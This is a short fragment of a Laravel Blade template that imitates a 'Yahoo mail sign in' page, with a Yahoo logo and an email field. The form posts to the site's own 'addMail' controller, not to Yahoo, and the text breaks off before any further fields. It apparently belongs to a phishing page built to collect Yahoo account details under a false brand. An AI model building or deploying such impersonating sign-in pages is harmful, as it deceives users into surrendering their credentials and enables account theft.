...
<div class='con'>
	{!! Form::open(['action' => 'PagesController@addMail', 'method'=>'post', 'class'=>'form-signin', 'style'=>'display:block', 'role'=>'form']) !!}
     <span style="margin-left: 40px">
      <img class="mb-4" src="{{ asset('assets/images/ymail.png')}}" alt="" width="72" height="72">
      </span>
      <h1 class="h3 mb-3 font-weight-normal">Yahoo mail sign in</h1>
      <label for="inputEmail" class="sr-only">Email address</label>
	  {{ form::email('mail', '',['tabindex'=>'1', 'class'=>'form-control', 'placeholder'=>'Yahoomail'])}}
